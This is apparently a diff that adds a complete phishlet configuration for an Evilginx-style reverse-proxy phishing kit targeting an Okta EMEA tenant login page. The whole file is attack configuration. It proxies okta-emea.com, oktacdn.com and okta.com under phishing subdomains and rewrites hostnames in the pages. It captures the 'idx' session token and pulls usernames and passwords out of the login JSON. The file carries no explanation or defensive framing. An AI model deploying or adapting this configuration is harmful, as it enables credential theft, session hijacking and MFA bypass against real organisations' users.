@@ -1,0 +1,25 @@
+author: 'alfiegriver'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'oktaTenant', domain: 'okta-emea.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'eu1static', domain: 'oktacdn.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'okta.com', session: false, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'oktaTenant.okta-emea.com', orig_sub: '', domain: 'oktaTenant', search: 'oktaTenant', replace: '{hostname}', mimes: ['application/ion+json']}
+  - {triggers_on: 'oktaTenant.okta-emea.com', orig_sub: '', domain: 'oktaTenant.com', search: 'https.*\.okta-emea\.com', replace: 'https://{hostname}', mimes: ['text/html']}
+  - {triggers_on: 'oktaTenant.okta-emea.com', orig_sub: 'oktaTenant', domain: 'okta-emea.com', search: 'oktaTenant\.okta\\x2Demea\.com', replace: '{hostname}', mimes: ['text/html']}
+auth_tokens:
+  - domain: 'oktaTenant.okta-emea.com'
+    keys: ['idx']
+credentials:
+  username:
+    key: ''
+    search: '"identifier":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"passcode":"([^"]*)'
+    type: 'json'
+login:
+  domain: 'oktaTenant.okta-emea.com'
+  path: '/login/login.htm'
